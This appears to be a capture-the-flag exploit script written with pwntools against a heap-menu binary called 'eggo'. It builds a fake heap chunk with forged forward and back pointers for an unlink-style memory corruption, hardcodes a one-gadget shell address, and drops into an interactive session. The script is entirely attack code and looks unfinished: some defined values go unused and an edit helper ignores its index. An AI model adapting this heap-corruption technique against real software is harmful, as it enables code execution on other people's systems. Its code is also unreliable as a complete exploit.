#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

target = process("./eggo", env={"LD_PRELOAD":"./libc-2.33.so", "LC_CTYPE":"C.UTF-8"})
#target = process("./eggo")
elf = ELF('eggo')
libc = ELF('libc-2.33.so')
g = gdb.attach(target)

def addNote(content,size):
    print(target.recvuntil("> "))
    target.sendline("1")
    target.sendline(str(size))
    print(target.recvuntil("egg "))
    egg=target.recvline()
    print(target.recvuntil("> "))
    target.sendline("4")
    target.sendline(egg)
    target.sendline(content)
    return egg

def deleteNote(index):
    print(target.recvuntil("> "))
    target.sendline("2")
    target.sendline(str(index))

def editNote(index,content):
    print(target.recvuntil("> "))
    target.sendline("4")
    target.sendline(content)


shell=0x7ffff7dd2000 + 0xcb5ca
strlen=0x401076
ptr=0x1f9f2b0

fakeChunk = b""
fakeChunk += p64(0x0)
fakeChunk += p64(0xa0)
fakeChunk += p64(ptr - (0x8*3))
fakeChunk += p64(ptr - (0x8*2))
fakeChunk += p64(0x0)
fakeChunk += b"1"*(0x420-0x40+0x20)
fakeChunk += p64(0x420)

fakeegg = addNote(fakeChunk,0x420)

anotheregg = addNote("blah", 0x10)

editNote(fakeegg,fakeChunk)

target.interactive()


